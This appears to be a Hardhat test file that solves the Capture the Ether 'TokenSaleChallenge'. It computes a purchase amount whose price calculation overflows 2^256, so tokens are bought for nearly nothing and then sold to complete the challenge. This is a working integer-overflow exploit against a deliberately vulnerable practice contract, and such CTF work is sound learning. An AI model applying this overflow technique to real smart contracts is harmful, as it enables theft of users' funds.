import { expect } from "chai";
import { ethers } from "hardhat";

const { utils, BigNumber } = ethers;

describe("TokenSaleChallenge", () => {
  describe("TokenSaleChallenge", () => {
    it.only("Solves the challenge", async () => {
      const [deployer ] = await ethers.getSigners();
      const challengeFactory = await ethers.getContractFactory("TokenSaleChallenge");
      const challengeContract = await challengeFactory.connect(deployer).deploy( {
        value: utils.parseEther("1"),
      });
      await challengeContract.deployed();
  
      const amountBouth = BigNumber.from(2).pow(256).div(BigNumber.from(10).pow(18)).add(1)
      const etherSent = amountBouth.mul(BigNumber.from(10).pow(18)).sub(BigNumber.from(2).pow(256))

      const buyTx = await challengeContract.buy(amountBouth, {
        value: etherSent,
      });
      await buyTx.wait();
  
      const sellTx = await challengeContract.sell(1);
      await sellTx.wait();
  
      expect(await challengeContract.isComplete()).to.be.true;
    });
  });
});